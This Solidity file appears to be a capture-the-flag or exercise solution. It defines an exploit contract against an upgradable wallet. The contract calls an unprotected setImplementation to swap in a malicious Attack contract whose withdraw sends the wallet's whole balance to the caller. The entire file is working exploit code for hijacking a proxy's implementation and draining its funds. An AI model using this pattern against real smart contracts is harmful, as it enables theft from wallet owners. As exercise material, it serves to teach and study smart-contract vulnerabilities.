// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

interface IUpgradableWallet {
    function implementation() external view returns(address);
    function owner() external view returns(address);
    function setImplementation(address) external;
    function withdraw() external;
}

contract UpgradableWalletExploit {
    address public target;

    constructor(address _target) {
        // target is address of UpgradableWallet
        target = _target;
    }

    function pwn() external {
        // write your code here and anywhere else
        Attack attack = new Attack();
        IUpgradableWallet _target = IUpgradableWallet(target);
        _target.setImplementation(address(attack));
        _target.withdraw();
    }
    
    receive() external payable {}
}

contract Attack {
    address public implementation;
    address payable public owner;
    
    function withdraw() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}